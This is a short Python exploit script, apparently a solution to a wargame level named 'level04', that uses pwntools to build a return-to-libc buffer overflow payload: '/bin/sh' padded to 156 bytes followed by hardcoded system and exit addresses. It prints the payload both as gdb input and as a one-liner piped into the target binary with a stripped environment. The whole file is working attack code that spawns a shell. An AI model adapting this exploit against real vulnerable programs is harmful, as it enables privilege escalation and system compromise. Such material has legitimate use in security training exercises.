#!/usr/bin/python3
import binascii
from pwn import p32

start = p32(0xfffdd000)
system_addr = p32(0xf7e6aed0)
exit_addr = p32(0xf7e5eb70)


data = b"/bin/sh\0"
payload = (data).ljust(156, b'A')
shellcode = system_addr + exit_addr + start
shellcode = ''.join(r'\x'+hex(letter)[2:] for letter in shellcode)
print(len(payload))

print("\n" + '*' * 80)
gcc_string = b'run < <(printf "'
print(repr(gcc_string + payload)[2:-1], end='')
print((shellcode + '")'))

print()
print("*" * 80)

print("python -c 'print(b\"", end="")
print(repr(payload)[2:-1], end='')
print((shellcode + '")\' | env -i PWD=/home/users/level04 SHELL=/bin/bash SHLVL=0 LINES=53 COLUMNS=211 /home/users/level04/level04'))
